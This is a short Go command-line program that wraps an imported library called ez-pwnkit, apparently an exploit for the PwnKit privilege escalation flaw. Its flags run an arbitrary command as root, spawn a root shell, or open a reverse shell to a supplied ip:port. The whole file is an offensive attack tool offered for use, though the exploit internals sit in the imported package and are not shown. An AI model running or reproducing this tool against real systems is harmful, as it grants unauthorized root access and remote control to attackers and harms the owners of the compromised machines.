package main

import (
	"flag"
	"fmt"
	"github.com/OXDBXKXO/ez-pwnkit"
)

func main() {
	cmd := flag.String("c", "", "Run command as root in separate process")
	output := flag.Bool("o", false, "Pipe output of forked command to terminal")
	shell := flag.Bool("s", false, "Spawn a root shell")
	reverseShell := flag.String("r", "", "Open a reverse-shell in separate process. Format: ip:port")
	flag.Parse()

	var err error
	if *reverseShell != "" {
		ez_pwnkit.RevShell(*reverseShell)
	} else if *cmd != "" {
		ez_pwnkit.Command(*cmd, *output)
	} else if *shell {
		ez_pwnkit.Shell()
	} else {
		flag.Usage()
	}

	if err != nil {
		fmt.Println(err)
	}
}
